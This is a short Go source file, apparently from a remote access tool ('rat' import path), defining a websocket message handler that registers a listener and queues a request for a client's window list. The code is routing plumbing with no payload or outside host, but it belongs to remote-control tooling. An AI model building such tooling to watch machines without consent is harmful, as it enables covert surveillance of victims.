package main

import (
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type WindowMessage struct{}

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[header.WindowsHeader] = ws
	client.Queue <- &WindowsPacket{}

	return nil
}
